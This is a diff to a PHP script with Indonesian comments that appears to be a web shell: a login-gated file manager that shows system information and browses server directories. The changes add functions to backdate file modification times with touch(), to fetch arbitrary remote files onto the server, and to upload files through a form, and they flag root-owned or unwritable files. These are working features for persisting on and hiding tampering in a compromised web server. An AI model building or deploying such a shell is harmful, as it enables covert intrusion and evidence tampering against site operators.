@@ -20,7 +20,7 @@ if (isset($_POST['logout'])) {
     exit;
 }
 
-if (!isset($_SESSION['authenticated']) || !$_SESSION['authenticated'])) {
+if (!isset($_SESSION['authenticated']) || !$_SESSION['authenticated']) {
     // Tampilkan form login jika belum terautentikasi
     echo '
     <style>
@@ -95,16 +95,37 @@ function displaySystemInfo() {
     }
 }
 
-// Fungsi untuk memeriksa apakah file atau folder dalam kondisi root atau terkunci
-function is_root_or_locked($file) {
-    $perms = fileperms($file);
-
-    // Cek apakah file atau folder tidak memiliki izin write untuk owner, group, dan others
-    if (($perms & 0x0002) == 0 && ($perms & 0x0010) == 0 && ($perms & 0x0080) == 0) {
-        return true;
+// Fungsi untuk mengubah tanggal modifikasi file
+function changeFileDate($path, $newDate) {
+    $timestamp = strtotime($newDate);
+    if (touch($path, $timestamp)) {
+        echo "<div class='alert alert-success'>Tanggal berhasil diubah.</div>";
+    } else {
+        echo "<div class='alert alert-danger'>Gagal mengubah tanggal.</div>";
     }
-    // Cek apakah izin file adalah 0000, 0444, 0555, atau setara
-    return ($perms === 0 || $perms === 0444 || $perms === 0555 || ($perms & 0xC000) == 0xC000);
+}
+
+// Fungsi upload file dari URL
+function uploadFromUrl($url, $saveTo) {
+    $fileContent = @file_get_contents($url);
+    if ($fileContent === FALSE) {
+        echo "<div class='alert alert-danger'>Gagal mengunduh file dari URL.</div>";
+        return;
+    }
+    if (@file_put_contents($saveTo, $fileContent) === FALSE) {
+        echo "<div class='alert alert-danger'>Gagal menyimpan file ke $saveTo.</div>";
+        return;
+    }
+    echo "<div class='alert alert-success'>File berhasil diupload: $saveTo</div>";
+}
+
+// Fungsi upload file dari form
+function uploadFromForm($file, $saveTo) {
+    if (@move_uploaded_file($file['tmp_name'], $saveTo)) {
+        echo "<div class='alert alert-success'>File berhasil diupload: $saveTo</div>";
+    } else {
+        echo "<div class='alert alert-danger'>Gagal mengupload file.</div>";
+    }
 }
 
 // Fungsi untuk memecah nama file panjang menjadi beberapa baris
@@ -113,6 +134,19 @@ function format_filename($filename) {
         return wordwrap($filename, 15, "<br>");
     }
     return $filename;
+}
+
+// Fungsi untuk menampilkan warna merah untuk file atau folder yang terkunci atau milik root
+function get_file_style($path) {
+    $perms = fileperms($path);
+    $owner = fileowner($path);
+    
+    // Cek apakah file milik root atau memiliki izin terbatas
+    if ($owner === 0 || !is_writable($path)) {
+        return "color: red;"; // Warna merah
+    }
+    
+    return ""; // Warna default
 }
 
 // Fungsi untuk menampilkan direktori dan file
@@ -135,8 +169,8 @@ function display_path_links($dir) {
         foreach ($folders as $folder) {
             $folderPath = realpath($dir . '/' . $folder);
             $encodedPath = urlencode(base64_encode($folderPath));
-            $lockedClass = is_root_or_locked($folderPath) ? 'locked' : '';
-            echo "<div class='list-group-item d-flex justify-content-between align-items-center $lockedClass'>";
+            $style = get_file_style($folderPath);
+            echo "<div class='list-group-item d-flex justify-content-between align-items-center' style='$style'>";
             echo "<a href='?dir=$encodedPath' class='btn btn-link'>" . format_filename($folder) . "/</a>";
             echo "<span class='ml-auto'>" . get_permissions($folderPath) . "</span>";
             echo "<span class='ml-2'>" . date("Y-m-d H:i:s", filemtime($folderPath)) . "</span>";
@@ -213,8 +247,8 @@ function display_path_links($dir) {
         foreach ($files as $file) {
             $filePath = realpath($dir . '/' . $file);
             $encodedPath = urlencode(base64_encode($filePath));
-            $lockedClass = is_root_or_locked($filePath) ? 'locked' : '';
-            echo "<div class='list-group-item d-flex justify-content-between align-items-center $lockedClass'>";
+            $style = get_file_style($filePath);
+            echo "<div class='list-group-item d-flex justify-content-between align-items-center' style='$style'>";
             echo "<span>" . format_filename($file) . "</span>";
             echo "<span class='ml-auto'>" . get_permissions($filePath) . "</span>";
             echo "<span class='ml-2'>" . date("Y-m-d H:i:s", filemtime($filePath)) . "</span>";
@@ -322,19 +356,6 @@ function get_permissions($file) {
     $info .= ($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-');
 
     return $info;
-}
-
-// Fungsi untuk mengubah izin manual ke oktal
-function str2oct($str) {
-    $oct = array(0, 0, 0);
-
-    for ($i = 0; $i < 3; $i++) {
-        if ($str[$i * 3 + 1] == 'r') $oct[$i] += 4;
-        if ($str[$i * 3 + 2] == 'w') $oct[$i] += 2;
-        if ($str[$i * 3 + 3] == 'x' || $str[$i * 3 + 3] == 's' || $str[$i * 3 + 3] == 't') $oct[$i] += 1;
-    }
-
-    return octdec(implode('', $oct));
 }
 
 // Fungsi untuk menghapus item
@@ -501,6 +522,19 @@ if (isset($_GET['download'])) {
     }
 }
 
+// Fungsi untuk mengubah izin manual ke oktal
+function str2oct($str) {
+    $oct = array(0, 0, 0);
+
+    for ($i = 0; $i < 3; $i++) {
+        if ($str[$i * 3 + 1] == 'r') $oct[$i] += 4;
+        if ($str[$i * 3 + 2] == 'w') $oct[$i] += 2;
+        if ($str[$i * 3 + 3] == 'x' || $str[$i * 3 + 3] == 's' || $str[$i * 3 + 3] == 't') $oct[$i] += 1;
+    }
+
+    return octdec(implode('', $oct));
+}
+
 $dir = isset($_GET['dir']) ? base64_decode(urldecode($_GET['dir'])) : '.';
 $displayDir = realpath($dir);
 
@@ -578,12 +612,6 @@ $dirArray = array_filter(explode(DIRECTORY_SEPARATOR, $displayDir), function($va
 
         .network-info {
             background-color: #e2e3e5;
-        }
-
-        /* Warna merah untuk file atau folder terkunci/root */
-        .list-group-item.locked {
-            color: red;
-            font-weight: bold;
         }
     </style>
 </head>
